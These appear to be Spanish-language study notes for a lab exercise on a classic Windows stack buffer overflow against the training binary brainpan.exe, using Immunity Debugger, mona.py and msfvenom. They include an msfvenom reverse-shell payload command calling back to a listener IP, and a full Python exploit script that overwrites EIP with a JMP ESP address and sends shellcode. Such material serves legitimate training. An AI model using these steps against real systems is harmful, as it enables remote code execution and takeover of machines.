---

---

---
Tags: #mona #inmunityDebuger #EIP #ESP #nops #shellcode 
## 1. Introducción

Estos apuntes describen una **metodología completa y ordenada** para explotar un **Buffer Overflow clásico (EIP overwrite)** en sistemas Windows usando:

- Immunity Debugger
    
- Mona.py
    
- Metasploit (msfvenom)
    

El objetivo final es **controlar EIP, redirigir el flujo con JMP ESP y ejecutar shellcode**.

---

## 2. Preparación del entorno

### Herramientas necesarias

- Immunity Debugger
    
- Plugin **mona.py** correctamente instalado
    
- Servicio vulnerable (ej: `brainpan.exe`)
    
- Kali Linux (para generar payloads)
    

En Immunity:

```text
!mona config -set workingfolder c:\mona
```

---

## 3. Descubrimiento del offset (control de EIP)

1. Crear pattern:
    

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

2. Enviar el pattern al servicio.
    
3. Tras el crash, obtener el valor de EIP.
    
4. Calcular offset:
    

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
```

Ejemplo:

```text
EIP = 0x35724134
Offset = 524
```

---

## 4. Verificación del offset

Payload de prueba:

```python
payload = b"A"*524 + b"BBBB"
```

Si EIP = `0x42424242`, el offset es correcto.

---

## 5. Identificación de Bad Characters

### 5.1 Generar bytearray

```text
!mona bytearray
```

Por defecto excluye `0x00`.

Excluir manualmente badchars conocidos:

```text
!mona bytearray -scp "0x00\x0a\x0d"
```

Se genera:

```text
bytearray.bin
```

---

### 5.2 Enviar bytearray en el payload

```python
payload = b"A"*524 + b"BBBB" + bytearray
```

---

### 5.3 Comparar en memoria

Obtener ESP tras el crash y ejecutar:

```text
!mona compare -f C:\mona\bytearray.bin -a 0x<ESP>
```

Resultado:

- Bytes corruptos → badchars
    
- Repetir el proceso hasta tener una lista limpia
    

---

## 6. Análisis de protecciones (ASLR / DEP / SafeSEH)

```text
!mona modules
```

Buscar módulos:

- Sin ASLR
    
- Sin DEP
    
- Sin SafeSEH
    

Ejemplo válido:

```text
brainpan.exe | False | False | False
```

---

## 7. Búsqueda de JMP ESP

Buscar instrucción que salte a ESP:

```text
!mona find -s "\xff\xe4" -m brainpan.exe
```

Ejemplo:

```text
0x080b500f : JMP ESP
```

Usar en **little endian**:

```python
eip = b"\x0f\x50\x0b\x08"
```

---

## 8. Generación del shellcode (Shikata Ga Nai)

Ejemplo reverse shell TCP:

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=192.168.1.140 LPORT=4444 \
-e x86/shikata_ga_nai \
-b "\x00\x0a\x0d" \
-f python
```

Notas:

- `-e x86/shikata_ga_nai` → encoder polimórfico
    
- `-b` → excluir badchars
    
- Añadir NOP sled antes del shellcode
    

---

## 9. Payload final (estructura)

```text
[ OFFSET ] [ JMP ESP ] [ NOPs ] [ SHELLCODE ]
```

Ejemplo:

```python
payload = before_eip + eip + b"\x90"*16 + shellcode
```

---

## 10. Script final de explotación

```python
#!/usr/bin/python3
import socket

# OFFSET correcto
offset = 524
before_eip = b"A" * offset

# JMP ESP (little endian)
eip = b"\x0f\x50\x0b\x08"

# Shellcode generado con msfvenom (Shikata Ga Nai)
shellcode = (b"\xbd\xbe\x7a\xa6\xa4\xd9\xca\xd9\x74\x24\xf4\x5e\x31\xc9"
             b"\xb1\x52\x31\x6e\x12\x03\x6e\x12\x83\x50\x86\x44"  # ...
             )

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.15.12.128", 9999))
s.send(payload)
s.close()
```

---

## 11. Resumen mental

1. Crash controlado
    
2. Offset exacto
    
3. Badchars limpios
    
4. Módulo sin protecciones
    
5. JMP ESP estable
    
6. Shellcode válido
    
7. Ejecución de código
    

---

Estos apuntes son directamente **copiables a Obsidian** y representan el flujo estándar de explotación de **Buffer Overflow clásico en Windows**.